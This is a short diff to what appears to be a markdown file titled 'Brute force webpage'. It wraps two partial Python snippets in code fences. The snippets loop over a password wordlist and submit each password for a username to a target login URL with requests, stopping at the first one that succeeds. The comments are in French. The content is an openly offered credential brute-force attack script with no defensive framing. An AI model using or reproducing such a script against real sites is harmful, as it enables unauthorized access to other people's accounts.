@@ -1,3 +1,6 @@
+# Brute force webpage 
+
+```python
 import requests 
 target_url = "https://MyWebSite.com/"
 username = "username"
@@ -12,11 +15,11 @@ with open(wordlist_path) as wordlist_file:        # variable pour accéder aux d
             break
         else:
             print(f"Failed: username='{username}', password='{password}'")
-            
+```            
             
             
             ////////////////////////////////////////////////////////
-            
+ ```python           
 import requests 
 import re
 target_url = "https://......../"
@@ -35,4 +38,4 @@ with open(wordlist_path) as wordlist_file:        # variable pour accéder aux d
             break
         else:
             print(f"Failed: username='{username}', password='{password}'")
-
+```
